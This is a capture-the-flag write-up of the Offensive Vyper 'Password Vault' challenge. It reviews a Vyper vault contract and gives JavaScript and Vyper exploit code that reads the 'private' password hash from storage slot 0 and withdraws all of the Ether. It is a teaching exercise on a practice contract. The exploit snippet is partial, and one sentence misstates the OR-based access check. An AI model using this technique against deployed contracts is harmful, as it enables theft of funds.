## 0) Intro

This article is the first write-up of the Offensive Vyper challenges created by [@jtriley_eth](https://twitter.com/jtriley_eth).

You can find instructions on how to get started [here](https://github.com/JoshuaTrujillo15/offensive_vyper).


## 1) Challenge

> <cite>The Password Vault is a vault that holds Ether and is password protected. Your Objective is to steal all of the Ether in the Vault. While the password is stored in this repository, the objective is to do it without reading the password from `test/secrets/dont-peek.js`.</cite>


## 2) Code Review

`PasswordVault.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/2c02cb408e95030215ff5d2aef087213f64edd17/contracts/password-vault/PasswordVault.vy)):

```python

# @version ^0.3.2

"""
@title Password Protected Vault
@author jtriley.eth
"""

password_hash: bytes32

owner: address

@external
def __init__(password_hash: bytes32):
    self.password_hash = password_hash

    self.owner = msg.sender


@external
def set_new_password(old_password_hash: bytes32, new_password_hash: bytes32):
    """
    @notice Sets a new password hash. Passwords are hashed offchain for security.
    @param old_password_hash Last password hash for authentication.
    @param new_password_hash New password hash to set.
    @dev Throws when password is invalid and the caller is not the owner.
    """

    assert self.password_hash == old_password_hash or msg.sender == self.owner, "unauthorized"
    
    self.password_hash = new_password_hash


@external
def withdraw(password_hash: bytes32):
    """
    @notice Withdraws funds from vault.
    @param password_hash Password hash for authentication.
    @dev Throws when password hash is invalid and the caller is not the owner.
    """

    assert self.password_hash == password_hash or msg.sender == self.owner, "unauthorized"

    send(msg.sender, self.balance)


@external
@payable
def __default__():
    pass

```

Contract main functions:

- `set_new_password` is used to set a new password. It accepts the old password and the new password to set. It checks if the `old_password_hash` parameter equals the initial password (set during contract creation) and if the `msg.sender` equals the owner. If one of these two conditions is false, the function fails. So, the owner can change the password even without knowing the old one, and anyone who knows the current password can change it with a new one. 

- `withdraw` allows to withdraw the contract balance and sends it to the `msg.sender`. To withdraw the entire amount is required to provide the password hash. There are two checks in place: one checks if the password provided is equal to the `password_hash`, and the other if the `msg.sender` is the contract owner. 


>The `@dev` comment of both functions says: 
><cite>Throws when password is invalid **and** the caller is not the owner.</cite>
>These conditions are evaluated in a logical disjunction (**OR**), so only one of the two needs to be true to execute the functions. 

Therefore, since we are interested in stealing all the ETH, if we find a way to discover the value of the  `password_hash`, we can withdraw the entire amount and solve the challenge (the condition `self.password_hash == password_hash` will be true).


#### Where is `password_hash` value stored?

`password_hash` is a contract variable and is initialized during the contract creation (line `14`). This variable is not public, so it's not accessible from the external. However, reading the [documentation](https://vyper.readthedocs.io/en/stable/scoping-and-declarations.html#storage-layout): 
> Storage variables are located within a smart contract at specific storage slots. By default, the compiler allocates the first variable to be stored at slot 0; subsequent variables are stored in order after that.

The `password_hash` is the first contract variable (line `8`), so it's stored in the slot `0`.

#### How can we read contract storage variables?

Using the `getStorageAt` from the `ethers` library we can access the contract storage.


## 3) Solution

The solution consists of two steps:
- retrieve the password hash from the contract storage
- call the withdraw function providing this password

`password-vault.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let password = await attacker.provider.getStorageAt(this.vault.address, 0)
        
        let exploit = await (await ethers.getContractFactory('PasswordVaultExploit', deployer)).deploy(this.vault.address)
        
        await exploit.connect(attacker).run(password)
        
    })

```


`PasswordVaultExploit.vy`:
```python

# YOUR EXPLOIT HERE
@external
def run(password_hash: bytes32):
    Passwordvault(self.target).withdraw(password_hash)

@external
@payable
def __default__():
    pass

```

You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/password-vault.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/PasswordVaultExploit.vy).


## 4) References

- [storage-layout](https://vyper.readthedocs.io/en/stable/scoping-and-declarations.html#storage-layout)
- [ethers - Provider.getStorageAt](https://docs.ethers.io/v5/api/providers/provider/#Provider-getStorageAt)